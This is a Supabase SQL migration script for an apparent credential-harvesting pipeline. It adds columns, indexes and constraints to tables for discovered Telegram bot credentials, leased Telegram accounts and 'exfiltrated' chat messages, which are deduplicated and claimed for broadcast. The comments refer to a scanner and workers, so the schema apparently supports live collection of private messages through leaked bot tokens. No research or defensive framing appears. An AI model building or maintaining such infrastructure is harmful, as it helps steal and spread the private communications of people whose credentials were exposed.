-- ============================================================
-- SAFE MIGRATION — Run in Supabase SQL Editor
-- All statements use IF NOT EXISTS / IF EXISTS guards.
-- Zero data loss. Safe to run on a live database.
-- ============================================================


-- ============================================================
-- 1. discovered_credentials — add missing top-level columns
--    (code writes these directly; without them Supabase silently
--     ignores the values or throws a column-not-found error)
-- ============================================================

ALTER TABLE discovered_credentials ADD COLUMN IF NOT EXISTS bot_username TEXT;
ALTER TABLE discovered_credentials ADD COLUMN IF NOT EXISTS bot_id       TEXT;
ALTER TABLE discovered_credentials ADD COLUMN IF NOT EXISTS chat_name    TEXT;
ALTER TABLE discovered_credentials ADD COLUMN IF NOT EXISTS chat_type    TEXT;

-- Index on bot_id for fast lookups by scanner dedup logic
CREATE INDEX IF NOT EXISTS idx_creds_bot_id ON discovered_credentials(bot_id);


-- ============================================================
-- 2. telegram_accounts — add session locking columns
--    (user_agent_srv.py writes locked_by / locked_until for
--     distributed session leasing; missing = runtime error)
-- ============================================================

ALTER TABLE telegram_accounts ADD COLUMN IF NOT EXISTS locked_by    TEXT;
ALTER TABLE telegram_accounts ADD COLUMN IF NOT EXISTS locked_until TIMESTAMPTZ;


-- ============================================================
-- 3. exfiltrated_messages — add broadcast claiming column
--    (flow_tasks.py uses broadcast_claimed_at for atomic
--     cross-worker claim; missing = broadcast race conditions)
-- ============================================================

ALTER TABLE exfiltrated_messages
    ADD COLUMN IF NOT EXISTS broadcast_claimed_at TIMESTAMPTZ DEFAULT NULL;


-- ============================================================
-- 4. Indexes — safe to re-run (IF NOT EXISTS)
-- ============================================================

CREATE INDEX IF NOT EXISTS idx_creds_status
    ON discovered_credentials(status);

CREATE INDEX IF NOT EXISTS idx_messages_credential_id
    ON exfiltrated_messages(credential_id);

CREATE INDEX IF NOT EXISTS idx_messages_is_broadcasted
    ON exfiltrated_messages(is_broadcasted)
    WHERE is_broadcasted = FALSE;

CREATE INDEX IF NOT EXISTS idx_exfiltrated_messages_claimed
    ON exfiltrated_messages(is_broadcasted, broadcast_claimed_at);

CREATE INDEX IF NOT EXISTS idx_accounts_phone
    ON telegram_accounts(phone);

CREATE INDEX IF NOT EXISTS idx_accounts_status
    ON telegram_accounts(status);


-- ============================================================
-- 5. Unique constraint on exfiltrated_messages
--    Prevents duplicate message rows per credential.
--    SAFE: removes dupes first (keeps oldest), then adds constraint.
-- ============================================================

-- 5a. Remove duplicate rows — keeps the oldest (lowest created_at)
--     Only runs if duplicates actually exist; harmless if not.
DELETE FROM exfiltrated_messages
WHERE id IN (
    SELECT id FROM (
        SELECT id,
               ROW_NUMBER() OVER (
                   PARTITION BY credential_id, telegram_msg_id
                   ORDER BY created_at ASC
               ) AS rn
        FROM exfiltrated_messages
    ) sub
    WHERE rn > 1
);

-- 5b. Add unique constraint (drop first to avoid "already exists" error)
ALTER TABLE exfiltrated_messages
    DROP CONSTRAINT IF EXISTS unique_msg_per_credential;

ALTER TABLE exfiltrated_messages
    ADD CONSTRAINT unique_msg_per_credential
    UNIQUE (credential_id, telegram_msg_id);


-- ============================================================
-- 6. status CHECK constraint — add 'error' as valid value
--    (code currently only uses pending/active/revoked but
--     future-proofing is cheap; skip if you want to keep it tight)
-- ============================================================
-- OPTIONAL — uncomment if you want to allow 'error' status:
-- ALTER TABLE discovered_credentials
--     DROP CONSTRAINT IF EXISTS discovered_credentials_status_check;
-- ALTER TABLE discovered_credentials
--     ADD CONSTRAINT discovered_credentials_status_check
--     CHECK (status IN ('pending', 'active', 'revoked', 'error'));


-- ============================================================
-- 7. VERIFICATION — run these after to confirm everything landed
-- ============================================================

-- Check columns on discovered_credentials
SELECT column_name, data_type, is_nullable
FROM information_schema.columns
WHERE table_name = 'discovered_credentials'
ORDER BY ordinal_position;

-- Check columns on exfiltrated_messages
SELECT column_name, data_type, is_nullable
FROM information_schema.columns
WHERE table_name = 'exfiltrated_messages'
ORDER BY ordinal_position;

-- Check columns on telegram_accounts
SELECT column_name, data_type, is_nullable
FROM information_schema.columns
WHERE table_name = 'telegram_accounts'
ORDER BY ordinal_position;

-- Check all indexes
SELECT indexname, tablename, indexdef
FROM pg_indexes
WHERE tablename IN ('discovered_credentials', 'exfiltrated_messages', 'telegram_accounts')
ORDER BY tablename, indexname;

-- Check constraints
SELECT conname, contype, conrelid::regclass
FROM pg_constraint
WHERE conrelid::regclass::text IN ('discovered_credentials', 'exfiltrated_messages', 'telegram_accounts');
